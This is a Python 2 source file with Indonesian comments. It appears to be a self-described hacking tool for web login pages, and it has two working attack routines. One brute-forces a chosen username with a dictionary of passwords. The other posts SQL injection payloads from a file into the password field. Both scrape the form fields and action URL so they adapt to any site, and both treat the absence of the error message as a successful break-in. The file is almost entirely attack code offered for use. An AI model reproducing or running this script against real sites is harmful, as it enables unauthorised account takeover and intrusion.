import ambiltag
import requests
import string

# library fungsi untuk instruksi umum untuk di tampilkan dalam main

def showAllHelp():
    print("\n-------------------------------")
    print("LIST PERINTAH UNTUK MELAKUKAN PROGRAM H|4|C|K  L|0|G:\n")
    print("-'dictionary' = Untuk melakukan hacking terhadap web login dengan dictionary attack")
    print("-'sql' = Untuk melakukan hacking terhadap web login dengan sql")
    print("-'keluar' / 'quit' / 'exit' = Keluar dari program")
    print("\n-------------------------------")

def sqlHack():
    input1 = raw_input("> Masukkan URL halaman login : ")
    input_err_msg = raw_input("> Masukan error message yang terdapat pada website tersebut : ")
    html_ekstrak = ambiltag.fetchHTMLdoc(input1)
    list_variabel_input = ambiltag.fetchListInput(html_ekstrak)

    # buat setup link request untuk di bruteforce agar fleksibel tiap form (cleansing)
    form_action_url = ambiltag.getFormAction(html_ekstrak)
    if form_action_url != None:
	    link_url_force = ""
	    pecah = input1.split("/")
	    pecah2 = form_action_url.split("/")
	    #print(pecah2)

	    if len(pecah2) == 1:
                link_url_force = ambiltag.linkCleansing(pecah, form_action_url)
	    else:
		    z = 0
		    match = False
		    while(z<len(pecah2)):			
			    if pecah2[z] == pecah[2]:
				    link_url_force = form_action_url
				    match = True
				    break
			    z = z + 1
		
		    if match == False:
			    link_url_force = ambiltag.linkCleansing(pecah, form_action_url)
		    else:
			    link_url_force = form_action_url
	    #print(pecah)
    else:
	    link_url_force = input1

    # print("FORM ACTIONNYA::::::" + link_url_force)
    # Kirim bruteforce request ke link yang sudah di cleansing
    file = open('sql.txt', 'rt')
    sukses = False
    for x in file.readlines():
	    x = x.strip()
	    print "Trying " + x
	    data1 = {
		    list_variabel_input[0] : "p00000019178",
		    list_variabel_input[1] : "%s" %x
	    }
	    print data1
	    response = requests.post(link_url_force, data1)
	    if input_err_msg not in response.text:
		    sukses = True
		    print x + " Success!"
		    break
    if sukses == False:
		print("--Gagal dalam meretas Website dengan metode sql--")
	
# fungsi untuk web hacking
def webHack():
    input1 = raw_input("> Masukkan URL halaman login : ")
    input_user = raw_input("> Masukkan email/username yang akan dilakukan dictionary attack : ");
    input_err_msg = raw_input("> Masukan error message yang terdapat pada website tersebut : ")
    html_ekstrak = ambiltag.fetchHTMLdoc(input1)
    list_variabel_input = ambiltag.fetchListInput(html_ekstrak)


    # buat setup link request untuk di bruteforce agar fleksibel tiap form (cleansing)
    form_action_url = ambiltag.getFormAction(html_ekstrak)
    if form_action_url != None:
	    link_url_force = ""
	    pecah = input1.split("/")
	    pecah2 = form_action_url.split("/")
	    #print(pecah2)
	    if len(pecah2) == 1:
                link_url_force = ambiltag.linkCleansing(pecah, form_action_url)
	    else:
		    z = 0
		    match = False
		    while(z<len(pecah2)):			
			    if pecah2[z] == pecah[2]:
				    link_url_force = form_action_url
				    match = True
				    break
			    z = z + 1
		
		    if match == False:
			    link_url_force = ambiltag.linkCleansing(pecah, form_action_url)
		    else:
			    link_url_force = form_action_url
	    #print(pecah)
    else:
	    link_url_force = input1
    #print("FORM ACTIONNYA::::::" + link_url_force)
    # Kirim bruteforce request ke link yang sudah di cleansing
    file = open(raw_input("> Masukkan path ke word list yang digunakan : "), 'rt')
    sukses = False
    for x in file.readlines():
	    x = x.strip()
	    print "Trying " + x
	    data1 = {
		    list_variabel_input[0] : "%s" %input_user,
		    list_variabel_input[1] : "%s" %x
	    }
	    print data1
	    response = requests.post(link_url_force, data1)
	    if input_err_msg not in response.text:
		    print x + " Success!"
		    sukses = True
		    break
    if sukses == False:
		print("--Gagal meretas website metode dictionary--")